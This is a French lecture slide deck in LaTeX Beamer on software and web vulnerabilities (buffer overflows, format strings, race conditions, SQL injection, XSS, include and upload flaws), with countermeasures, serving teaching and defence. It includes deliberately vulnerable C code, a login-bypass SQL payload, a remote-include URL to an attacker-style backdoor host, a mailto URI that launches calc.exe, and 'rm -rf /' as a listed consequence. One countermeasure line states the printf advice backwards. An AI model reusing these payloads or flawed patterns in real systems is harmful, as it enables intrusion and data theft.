@@ -1,0 +1,956 @@
+\documentclass{beamer}
+\usepackage[french]{babel}
+\mode<presentation>
+\usepackage[latin1]{inputenc}
+
+\usetheme{Luebeck}
+%\usecolortheme{seahorse}
+\setbeamertemplate{bibliography item}[text]
+\setbeamertemplate{blocks}[rounded][shadow=true]
+
+
+\title[Introduction à la sécurité informatique]{Failles logicielles}
+\institute{\textbf{Pierre Ramet:} \texttt{ramet@labri.fr}}
+
+
+\author{DUT S4}
+\date{2013-2014}
+
+%\setcounter{tocdepth}{1}
+\begin{document}
+
+\begin{frame}
+
+  \titlepage
+
+\end{frame}
+
+\AtBeginSubsection[]
+                  {
+                    \begin{frame}<beamer>
+                      \frametitle{Plan}
+                      \tableofcontents[currentsection,currentsubsection,sectionstyle=show/shaded,subsectionstyle=show/shaded/hide]
+                    \end{frame}
+                  }
+
+
+\section{Introduction}
+
+\begin{frame}{Vulnérabilités applicatives}
+\begin{itemize}
+\item Beaucoup d'applications sont vulnérables à cause d'erreurs de programmation
+\begin{itemize}
+\item Manque de temps
+\item Manque de motivation
+\item Manque de formation
+\item Malveillances volontaires
+\end{itemize}
+\item Toutes les application ont besoin de sécurité
+\begin{itemize}
+\item Services réseaux
+\item Application téléchargées (applet Java)
+\item Applications métier
+\item Applications utilisées par les administrateurs (root)
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Quelques exemples de failles}
+\begin{itemize}
+\item Débordements de tampon (stack overflows, heap overflows)
+\item Chaînes de format (format strings)
+\item Concurrences mal maîtrisées (race conditions)
+\item Fuites d'informations (side channels)
+\item Entrées utilisateur non vérifiées (injections)
+\item etc.
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Etat de l'art}
+\begin{itemize}
+\item En 2000, David Wagner (université de Berkeley) déclarait
+que 50 \% des vulnérabilités logicielles rapportées par le CERT
+de 1988 à 1998 étaient dues aux débordements de tableaux
+\item En 2004, le directeur de la National Cyber Security Division du
+U.S. Dpt. of Homeland Security déclarait que 95 \% des failles
+de sécurité logicielles étaient dues à 19 erreurs bien connues
+\item En 2006, Gary McGraw de Cigital déclarait que les failles de
+sécurité logicielles étaient dues à 50\% aux erreurs de programmation
+et à 50\% aux erreurs de conception
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Quelles conséquences ?}
+\begin{itemize}
+\item Une société perd en moyenne 204 000 USD par an consécutivement aux incidents de sécurité informatique
+\item \textbf{Confidentialité}
+\begin{itemize}
+\item Intrusion sur l'ordinateur exécutant le logiciel (vol de fichiers, etc.)
+\item Fuites d'informations indirectes (side channel attacks)
+\item Les plus dangereuses: les \textit{remote root}
+\end{itemize}
+\item \textbf{Intégrité}
+\begin{itemize}
+\item Suppression de fichiers
+\item Modification de fichiers
+\end{itemize}
+\item \textbf{Disponibilité}
+\begin{itemize}
+\item Denial Of Service (le plus courant)
+\item Defacages de pages web
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Ce que l'on va voir}
+\tableofcontents
+\end{frame}
+
+
+\section{Vulnérabilités applicatives}
+\subsection{Les buffer overflows}
+
+\begin{frame}{Les buffers overflows}
+\begin{itemize}
+\item Environ \textbf{2/3} des vulnérabilités
+\item Écriture de données \textbf{en dehors} de la
+zone allouée pour le tableau
+\item Dans le meilleur des cas, cette vulnérabilité peut entrainer un
+comportement erratique du programme fautif (déni de service)
+\item Dans le pire des cas, l'attaquant exploitant cette faille peut exécuter un
+\textbf{code malicieux} qu'il a construit
+\begin{itemize}
+\item Ajout de comptes utilisateurs
+\item Lancement d'un \textbf{shell}
+\item Modification du programme
+\end{itemize}
+\item Le code malicieux exécuté possède \textbf{les mêmes droits} que l'application fautive
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Programmes concernés}
+\begin{itemize}
+\item Cette attaque cible principalement les programmes écrits en \textbf{C} et \textbf{C++}
+\item D'autres langages sont cependant vulnérables dans certaines conditions:
+\begin{itemize}
+\item Java
+\item C\#
+\item Visual Basic
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Les buffers overflow}
+\begin{itemize}
+\item Deux types de buffer overflow:
+\begin{itemize}
+\item Stack overflow: écriture en dehors d'un tableau alloué sur la pile (i.e variable locale)
+\item Heap overflow: écriture en dehors d'un tableau alloué sur le tas (malloc)
+\end{itemize}
+%\item Rappel sur les appels de fonction (au tableau)
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Premier exemple: stack overflow}
+\begin{itemize}
+\item Exemple de programe vulnérable:
+\end{itemize}
+\begin{figure}
+\small{
+\begin{verbatim}
+void copy (char *input)
+{
+   char buf[8];
+   strcpy (buf, input);
+   ...
+}
+int main (int argc, char *argv[])
+{
+   ...
+   copy (argv[1]);
+   ...
+}
+\end{verbatim}}
+\caption{demo.c}
+\end{figure}
+\end{frame}
+
+
+\begin{frame}[fragile]{Le débordement}
+\begin{itemize}
+\item Exécution de l'application:
+\begin{figure}
+\small{
+\begin{verbatim}
+[ramet@ns bufferoverflow]$ ./demo aaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault
+\end{verbatim}}
+\end{figure}
+\item Sous debugger:
+\begin{figure}
+\small{
+\begin{verbatim}
+[ramet@ns bufferoverflow]$ gdb demo
+(gdb) run aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Starting program: /users/ramet/bufferoverflow/demo
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()  <- en ascii 'aaaa'
+\end{verbatim}}
+\end{figure}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Que s'est-il passé ?}
+\begin{figure}
+\includegraphics[scale=1]{s1.png}
+\end{figure}
+\end{frame}
+
+
+\begin{frame}{Exploitation}
+\begin{itemize}
+\item Il est possible de faire encore \textbf{plus nuisible} que planter le programme
+\item \textbf{Rediriger le flot de contrôle} du programme vers une fonction 
+\begin{itemize}
+\item Exemple: vers la fonction \textit{"autoriser\_acces"} de \texttt{login}
+\end{itemize}
+\item \textbf{Exécuter du code malicieux}:
+\begin{itemize}
+\item Le buffer contient du code exécutable
+\item Le pointeur de retour est écrasé pour pointer vers le code malicieux au sein du buffer
+\item Au retour de la méthode, le code malicieux est donc \textbf{exécuté}
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Exécution de code arbitraire}
+\begin{figure}
+\includegraphics[scale=1]{s2.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Heap overflow}
+\begin{itemize}
+\item Un peu plus compliqué
+\item Les blocs de mémoire sont gérés par l'OS sous forme de liste chaînée
+\item Si un attaquant dépasse la capacité d'un bloc, il peut corrompre la liste chaînée
+\item Lors du free() d'un bloc corrompu, il sera alors possible de modifier 4 octets en mémoire
+\begin{itemize}
+\item Choisi par l'attaquant
+\item Souvent, c'est un pointeur de retour de fonction sur la pile qui est modifié (cf. stack overflow)
+\item A la fin, exécution de code malicieux dans le buffer
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Heap overflow}
+\begin{figure}
+\includegraphics[scale=1]{h1.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Quel code malicieux ?}
+\begin{itemize}
+\item Différents types de codes malicieux exécutés:
+\begin{itemize}
+\item Lancement d'un shell local
+\begin{itemize}
+\item Qui s'exécutera \textbf{avec les même droits que l'application} exploitée
+\item Intéressant pour les applications lancées en root ! (local root)
+\end{itemize}
+\item Lancement d'un shell qui écoute sur un port (remote shell/remote root)
+\item Lancement d'un serveur VNC
+\item Exécution d'un \textbf{virus/vers} :
+\begin{itemize}
+\item Le vers Slammer (exploit de SQL Server 2000)
+\item Le vers Sasser (exploit du service Active Directory)
+\end{itemize}
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Pour information}
+\begin{itemize}
+\item De nouvelles failles sont découvertes chaque jour !
+\begin{figure}
+\includegraphics[scale=0.3]{cert.png}
+\end{figure}
+\item Quelques adresses:
+\begin{itemize}
+\item www.securityfocus.com
+\item www.frsirt.com
+\item www.cert-ist.com
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Comment s'en prémunir ?}
+Comment se protéger des buffers overflow ?
+\begin{itemize}
+\item Formation des développeurs
+\item Revue de code
+\begin{itemize}
+\item Visuelle
+\item Automatique (de nombreux outils existent)
+\end{itemize}
+\item Audit
+\item Protection de la pile (pile non exécutable, cookie, etc)
+\item Adresses aléatoires
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Formation des développeurs}
+\begin{itemize}
+\item Ne \textbf{jamais} utiliser de fonctions de recopie qui ne vérifient pas la taille du tableau en entrée
+\item Liste non exhaustive:
+\begin{figure}
+\begin{tabular}{|c|c|}
+\hline
+\textbf{Pas bien} & \textbf{Bien} \\
+\hline
+gets(str) & fgets(stdin,str,10) \\
+\hline
+strcpy(str1,str2) & strncpy(str1,str2,10) \\
+\hline
+strcat(str1,str2) & strncat(str1,str2,10) \\
+\hline
+scanf("\%s",str) & scanf("\%10s",str) \\
+\hline
+cin $>>$ str & scanf("\%10s",str) \\
+\hline
+\end{tabular}
+\end{figure}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Revue de code et audit}
+\begin{itemize}
+\item Utiliser des outils de \textbf{revue de code}:
+\begin{itemize}
+\item Valgrind: très utile
+\item RATS (Rough Auditing Tool for Security)
+\item Electric Fence
+\item Compiler en \texttt{-Wall}
+\end{itemize}
+\item \textbf{Auditer} l'application:
+\begin{itemize}
+\item Par un professionnel
+\item Tests manuels
+\item Tests automatiques
+\begin{itemize}
+\item Fuzzing: envoi de données aléatoires à l'application
+\item Spike, Fuzz, Protos
+\end{itemize}
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Protection de la pile}
+\begin{itemize}
+\item Ajout de \textit{"canary"} sur la pile
+\item Si le canary est modifié, alors un buffer overflow a eu lieu $\Rightarrow$ arrêt de l'application
+\item Le canary doit être \textbf{aléatoire}
+\end{itemize}
+\begin{figure}
+\includegraphics[scale=1]{s4.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Protection de la pile (2)}
+\begin{itemize}
+\item Pile (et tas) non exécutables
+\begin{itemize}
+\item \textbf{Interdire l'exécution de code sur la pile}
+\item Wax, W$\oplus$X, DEP
+\begin{itemize}
+\item \texttt{Segfault} si du code est exécuté sur la pile
+\end{itemize}
+\item Soit hardware (pagination sur les processeurs recents) soit software (segmentation+pagination)
+\item Peut poser des problèmes pour certains programmes
+\begin{itemize}
+\item Trampolines, JIT compiling, etc.
+\end{itemize}
+\item Exemple: un exécutable Windows contenant une section \texttt{.starfrc} ne sera pas protégé par le DEP
+\end{itemize}
+\item Certaines attaques sont quand même réalisables
+\begin{itemize}
+\item \texttt{\textit{Return into libc}}
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Ret into libc}
+\begin{itemize}
+\item Mise en place pour contourner les protections de la pile
+\item On utilise des fonctions de la libc pour exécuter des opérations malicieuses
+\begin{itemize}
+\item Aucun code exécuté sur la pile ou le tas
+\item Exemple: exécution de la fonction \texttt{system}
+\end{itemize}
+\end{itemize}
+\begin{figure}
+\includegraphics[scale=1]{s3.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Adresse aléatoires}
+\begin{itemize}
+\item \textbf{ADSR}: Adress Space Layout Randomisation
+\item Pile, tas, code et librairies sont placées à des adresses aléatoires
+\item Difficile d'exploiter un overflow
+\begin{itemize}
+\item Il faut tout d'abord déterminer l'adresse:
+\begin{itemize}
+\item De la pile (buffer overflow)
+\item Du tas (heap overflow)
+\item Des librairies (ret into libc)
+\end{itemize}
+\end{itemize}
+\item Quand même vulnérable dans certains cas
+\begin{itemize}
+\item Attaque exhaustive sur les adresses
+\item Sous Vista, seules 256 possibilités pour les adresses
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\subsection{Les format strings}
+\begin{frame}{Les format strings}
+\begin{itemize}
+\item Problème connu depuis juin 1999 et exploité
+depuis juin 2000
+\item Provient de manipulations erronées de chaînes de caractères
+\begin{itemize}
+\item Lecture de la mémoire (fuite d'informations)
+\item Exécution de code malicieux
+\end{itemize}
+\item Leur exploitation ont conduit à des
+vulnérabilités 
+\begin{itemize}
+\item "remote root" (wu-ftpd, linux
+tpc.statd, ...) 
+\item "local root" (OpenBSD fstat, ...)
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Fonctionnement de printf}
+\begin{itemize}
+\item \texttt{printf("les nombres valent \%d \%d\\n",a,b);}
+\begin{figure}
+\includegraphics[scale=1]{fs1.png}
+\end{figure}
+\item Que se passe-t-il pour \texttt{printf(chaine\_utilisateur);} ?
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Fuite d'information}
+\begin{itemize}
+\item Exemple:
+\begin{figure}
+\small{
+\begin{verbatim}
+int main (int argc, char *argv[])
+{ 
+   printf (argv[1]);
+   return 0;
+}
+\end{verbatim}}
+\caption{test.c}
+\end{figure}
+\item Exploitation:
+\begin{figure}
+\small{
+\begin{verbatim}
+./test "%x %x" (-> printf("%x %x");)
+12ffabcd 4041217b (contenu de la pile)
+\end{verbatim}}
+\end{figure}
+\item Toute la pile pourrait être lue !
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Format string + buffer overflow}
+\begin{itemize}
+\item Exemple: vulnérabilité de qpop 2.53
+\begin{figure}
+\begin{verbatim}
+void fonction (char *user)
+{
+   char outbuf [512];
+   char buffer [512];
+   sprintf (buffer,"ERR Wrong command: %400s",user);
+   sprintf (outbuf,buffer);
+}
+\end{verbatim}
+\end{figure}
+\item Le deuxième sprintf n'est pas sûr !
+\item On peut faire déborder \texttt{outbuf}
+\begin{itemize}
+\item Modification de l'adresse de retour de la fonction
+\item Exécution de code malicieux (cf. stack overflow)
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Exploitation}
+\begin{itemize}
+\item \texttt{user}:\\
+\texttt{[Shellcode (392 octets) + "\%97c"+ adresse shellcode]}
+\item Le \texttt{\%97c} est \textbf{interprété} comme "écrire 97 fois le caractere au sommet de la pile"
+\item Résultat, ce ne sont pas 400 octets qui sont écrits par sprintf, mais 516 !
+\item \textbf{Ecrasement} de l'adresse de retour de la fonction avec l'adresse du shellcode
+\item Au retour de la fonction, \textbf{exécution} du shellcode dans le buffer
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Contre-mesures}
+\begin{itemize}
+\item Formation
+\item Revue de code
+\item Audit
+\item \textbf{Interdire} les \texttt{printf} sans chaîne de formatage
+\begin{itemize}
+\item \texttt{printf(string)} au lieu de \texttt{printf("\%s",string)}
+\item Surtout si la variable string contient des données de l'utilisateur
+\end{itemize}
+\end{itemize}
+
+\end{frame}
+
+
+\subsection{Races conditions et autres attaques}
+\begin{frame}{Race conditions}
+\begin{itemize}
+\item Toute ressource (fichiers, structure de
+données, ...) peut être manipulée
+simultanément par plusieurs processus ou
+plusieurs threads
+\item Certaines opérations doivent donc être
+rendues atomiques
+\item Les droits d'accès doivent être très précis
+\item Exemple: quel est le danger du programme suivant ?
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Exemple}
+\begin{itemize}
+\item Programme suid exécuté en root: \texttt{ecrire <fichier> <texte>}
+\end{itemize}
+\tiny{
+\begin{verbatim}
+void main (int argc,char **argv)
+{
+   struct stat st;
+   FILE *fp;
+   stat(argv[1],st);
+   if (st.st_uid != getuid ()) { 
+       fprintf(stderr,"%s ne vous appartient pas !\n", argv [1]);
+       exit(EXIT_FAILURE);
+   }
+   if (! S_ISREG (st.st_mode)) { 
+       fprintf(stderr,"%s n'est pas un fichier normal\n", argv [1]);
+       exit(EXIT_FAILURE);
+   }
+   fprintf(fp,"%s\n",argv [2]);
+   fclose(fp);
+   exit(EXIT_SUCCESS)
+}
+\end{verbatim}}
+\end{frame}
+
+\begin{frame}{Exploitation}
+\begin{itemize}
+\item Avec un bon timing, il est possible de:
+\begin{itemize}
+\item Créer un lien symbolique vers un fichier sensible
+\begin{itemize}
+\item /etc/passwd par exemple
+\end{itemize}
+\item Modifier ce fichier, alors qu'en théorie vous n'aviez pas les droits
+\end{itemize}
+\item Les applications root suid qui créent des fichiers temporaires sont les plus vulnérables
+\begin{itemize}
+\item Si le nom du fichier temporaire est \textbf{prévisible}
+\item Idem, création d'un lien symbolique portant le nom du fichier temporaire vers un autre fichier sensible
+\item Le programme écrasera malencontreusement un fichier important
+\item Très dangereux si l'attaquant a \textbf{le contrôle} de ce qui est écrit !
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Contre-mesures}
+\begin{itemize}
+\item Formation
+\item Revue de code
+\item Penser aux accès concurrents !
+\begin{itemize}
+\item Verouillage des fichiers
+\item Mutex
+\end{itemize}
+\item Créer des fichiers temporaires avec \texttt{mkstemp} + \texttt{umask}
+\begin{itemize}
+\item Nom de fichier temporaire aléatoire
+\item Permissions du fichier correctes
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Autres attaques}
+\begin{itemize}
+\item Beaucoup d'autres attaques
+\begin{itemize}
+\item Exécution de commandes arbitraires:
+\begin{itemize}
+\item \texttt{sprintf (buf, "system lpr -P \%s", user\_input);}
+\end{itemize}
+\item Mauvaise gestion des erreurs
+\item Fuites d'information diverses
+\end{itemize}
+\item Ne \textbf{jamais} faire confiance aux entrées utilisateur
+\item Vérifier son code
+\begin{itemize}
+\item Doit faire partie de la \textbf{politique de sécurité}
+\end{itemize}
+\item Mener des audits réguliers
+\item \textbf{Former} les programmeurs
+\end{itemize}
+\end{frame}
+
+
+\section{Vulnérabilités web}
+
+
+\subsection{Injections SQL}
+\begin{frame}{Les vulnérabilités web}
+\begin{itemize}
+\item Failles de plus en plus populaires avec l'essor d'internet
+\item La plupart des sites sont développés
+\begin{itemize}
+\item Trop vite
+\item Par des personnes peu expérimentées
+\end{itemize}
+\item En résulte de \textbf{nombreuses failles}
+\begin{itemize}
+\item Désormais exploitées à grande échelle et de manière automatique
+\item cf. les réseaux de type BotNet
+\end{itemize}
+\item Exploitations dangereuses
+\begin{itemize}
+\item Vol d'information
+\item Le site attaqué peut servir a envoyer des \textit{malwares} aux visteurs
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Injection SQL}
+\begin{itemize}
+\item Beaucoup d'applications web (ASP,PHP,J2EE) s'appuient
+sur des bases de données
+\item Les requêtes SQL utilisent des
+informations saisies par les \textbf{utilisateurs}
+\item Les informations doivent être \textbf{traitées}
+avant utilisation
+\item Si ce n'est pas le cas, possibilité pour l'attaquant de soumettre des \textbf{requêtes SQL malicieuses}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Exemple}
+\begin{figure}
+\includegraphics[scale=0.6]{sql.png}
+\end{figure}
+\begin{itemize}
+\item \$login et \$password entrées utilisateur
+\item Quel risque si les entrées du  formulaire ne sont pas vérifiées ?
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Attaque}
+\begin{itemize}
+\item L'attaquant rentre:
+\begin{itemize}
+\item Login : \texttt{Admin}
+\item Password : \texttt{' or 'a'='a}
+\end{itemize}
+\item Requête SQL effectuée par l'application:
+\begin{itemize}
+\item \texttt{SELECT id FROM users WHERE login='Admin' AND password='' or 'a'='a'}
+\end{itemize}
+\item L'attaquant \textbf{obtient le compte Admin} !
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Conséquences}
+\begin{itemize}
+\item Il est possible de faire \textbf{bien pire}
+\begin{itemize}
+\item Exécution d'une requête SQL arbitraire
+\item Lecture de toute la base de données (notamment les mots de passe)
+\item Modification de la base de données
+\end{itemize}
+\item Les injection SQL étaient \textbf{très courantes} vers 2000-2004
+\begin{itemize}
+\item Les forums PHP
+\item Les formulaire d'auhtentification des \textit{"petits"} sites
+\item Les livres d'or, les blogs, etc.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Contre-mesures}
+\begin{itemize}
+\item Formation
+\item Revue de code
+\item Audit
+\item Toujours \textbf{vérifier les entrées utilisateurs}
+\begin{itemize}
+\item Exemple: \texttt{mysql\_escape\_string()} en PHP
+\end{itemize}
+\item Ne pas réinventer la roue, c'est le meilleur moyen de se tromper !
+\end{itemize}
+\end{frame}
+
+\subsection{Cross Script Scripting}
+\begin{frame}{Les cookies}
+\begin{itemize}
+\item http est un protocole sans notion de session:
+pas de lien entre les requêtes reçues par le
+serveur
+\item Une session doit être construite
+artificiellement:
+\begin{itemize}
+\item Par un \textbf{cookie} envoyé au navigateur
+\item Par manipulation d'URL contenant un identifiant
+\item Par des paramètres d'un programme
+\item etc.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Cross Site Scripting}
+\begin{figure}
+\includegraphics[scale=0.5]{xss.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Comment est récupéré le cookie ?}
+\begin{itemize}
+\item Le client a consulté un site pirate qui le lui a "volé" (souvent via du javascript malicieux)
+\item Le client a reçu un mail contenant un lien vers un site pirate
+\item Le serveur consulté a été piraté et contient un
+lien vers le site pirate
+\item Un code malveillant pointant vers le site
+pirate a été inséré dans les données du site (exemple: post de forum)
+\item etc.
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Conséquences}
+\begin{itemize}
+\item L'attaquant a accès \textbf{à la session} de la victime
+\item Perte de \textbf{confidentialité}:
+\begin{itemize}
+\item Webmail, forum, etc.
+\end{itemize}
+\item \textbf{Intégrité}:
+\begin{itemize}
+\item Modification des comptes web
+\item Site de banque en ligne, jeux en ligne, etc.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Risque et contre-mesures}
+\begin{itemize}
+\item Les risques sont cette fois-ci pour le \textbf{client}
+\begin{itemize}
+\item Eviter de surfer sur des sites illégaux
+\item Ne pas cliquer sur les liens de mails étranges
+\end{itemize}
+\item Mais cela n'implique pas que le \textbf{serveur} n'est pas fautif
+\begin{itemize}
+\item Ne pas autoriser le javascript dans les entrées utilisateurs (forum, commentaires de blog)
+\item Valider les entrées utilisateur
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+\subsection{Autres attaques}
+\begin{frame}{Décodage des URL}
+\begin{itemize}
+\item Rappel encodage des urls (au tableau)
+\item Un serveur web est amené à prendre une décision en fonction
+d'une URL
+\begin{itemize}
+\item Le chemin indiqué ne doit pas sortir de la racine du serveur
+WEB
+\item L'extension du fichier décide du handler à activer (.cgi, .jsp,
+...)
+\begin{itemize}
+\item Un fichier se terminant par \texttt{.jsp\%00.html} peut être
+considéré comme un fichier html par les mécanismes de
+sécurité mais exécuté comme du code java (Java Server
+Page)
+\end{itemize}
+\item L'utilisateur doit avoir les permissions adéquates pour
+accéder au fichier ou répertoire indiqué
+\end{itemize}
+\item Beaucoup de serveurs web effectuent des tests de sécurité
+\textbf{avant le décodage} et non après
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Exemple de mauvais décodage d'URL}
+\begin{itemize}
+\item Vulnérabilité découverte en juillet 2007
+\item Concerne Firefox sous Windows XP
+avec Internet Explorer 7 installé
+\item Mauvaise gestion du caractère spécial
+"\%00" dans les chaînes formant les URI
+(Uniform Ressource Identifier)
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Exemple de mauvais décodage d'URL (2)}
+\begin{itemize}
+\item \tiny{\texttt{Envoyer votre courrier ici
+$<$a target="\_blank" href='mailto:\%00\%00../../../../../windows/system32/cmd".exe .
+./../../../../../windows/system32/calc.exe " - " toto.bat'$>$ramet@enseirb.fr$<$/a$>$}}
+\end{itemize}
+\begin{figure}
+\includegraphics[scale=0.6]{uri.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Upload de fichiers}
+\begin{itemize}
+\item Certains sites proposent d'uploader des fichiers de données
+\item Ces fichiers sont directement accessibles depuis internet
+\item Souvent, des \textbf{règles de sécurité} sont appliquées sur le nom du fichier uploadé
+\begin{itemize}
+\item Pas de \texttt{.exe}, de \texttt{.dll}, etc
+\item Pas de \texttt{.php}, \texttt{.asp} ou de \texttt{.jsp/.do}
+\end{itemize}
+\item Lorsque ces règles sont appliquées "à la main", des failles sont parfois présentes
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Exemple}
+\begin{itemize}
+\item Upload de \texttt{toto.txt.php} sur \texttt{monsite.com/upload} 
+\begin{itemize}
+\item Passe les règles de filtrage car la première extension est \texttt{.txt}
+\end{itemize}
+\item L'attaquant accède à \texttt{www.monsite.com/toto.txt.php}
+\item Le script php est \textbf{exécuté sur le serveur} !
+\begin{itemize}
+\item Installation d'une backdoor
+\item \texttt{rm -rf /}
+\item Création de comptes
+\item etc.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{Faille d'include}
+\begin{itemize}
+\item Certains sites recherchent même les failles de sécurité !
+\item Exemple: au début du PHP, l'instruction \texttt{include} était très souvent utilisée
+\begin{figure}
+\begin{verbatim}
+#index.php
+page_a_charger=$page
+include($page_a_charger)
+\end{verbatim}
+\caption{index.php}
+\end{figure}
+\item \texttt{http://monsite.com/index.php?page=contact.php}
+\item Attaque: \small{\texttt{monsite.com/index.php?page=www.badboy.com/backdoor.php}}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{Contre-mesures}
+\begin{itemize}
+\item Utiliser un serveur web \textbf{à jour}
+\item Utiliser les options de sécurité des langages web utilisés
+\begin{itemize}
+\item Exemple: PHP en mode \texttt{safe}
+\end{itemize}
+\item Développer de manière consiencieuse
+\begin{itemize}
+\item Eviter de réinventer la roue
+\item Valider les entrées utilisateurs
+\item Tester, auditer
+\end{itemize}
+\item Tout logger, et inspecter régulièrement les logs
+\begin{itemize}
+\item Réparer au plus vite toute attaque
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Contre-mesures (2)}
+\begin{itemize}
+\item De nos jours, la plupart des attaques web sont automatisées
+\begin{itemize}
+\item Réseaux de Botnets
+\item vers/virus
+\end{itemize}
+\item Il devient indispensable de \textbf{refuser l'accès} à ces programmes malveillants
+\begin{itemize}
+\item Blacklisting d'IP de machines malveillantes
+\item Les Captcha !
+\end{itemize}
+\end{itemize}
+\begin{figure}
+\includegraphics[scale=0.5]{captcha.png}
+\end{figure}
+\end{frame}
+
+\begin{frame}{Conclusion}
+Ce que l'on a vu:
+\begin{itemize}
+\item Vulnérabilités logicielles
+\begin{itemize}
+\item Stack overflow
+\item Heap overflow
+\item Race condition et autres attaques
+\end{itemize}
+\item Vulnérabilités web
+\begin{itemize}
+\item Injection SQL
+\item Failles XSS
+\item Faille include, upload de fichiers, décodage d'URL
+\end{itemize}
+\item Les failles logicielles sont \textbf{très nombreuses}
+\item ... et souvent \textbf{critiques} (local root/remote root)
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Contres mesures}
+\begin{itemize}
+\item Penser à la sécurité tout le temps !
+\begin{itemize}
+\item Respecter la \textbf{politique qualité} de l'entreprise
+\item Toujours \textbf{valider} les entrées utilisateur
+\item Audit, tests unitaires, fuzzing
+\end{itemize}
+\item Utiliser des services/applications \textbf{à jour}
+\begin{itemize}
+\item De nouvelles failles sont découvertes chaque jour
+\end{itemize}
+\item Ne pas sous-estimer l'adversaire
+\begin{itemize}
+\item Il dispose toujours de plus de temps que vous
+\end{itemize}
+\end{itemize}
+\end{frame}
+\end{document}
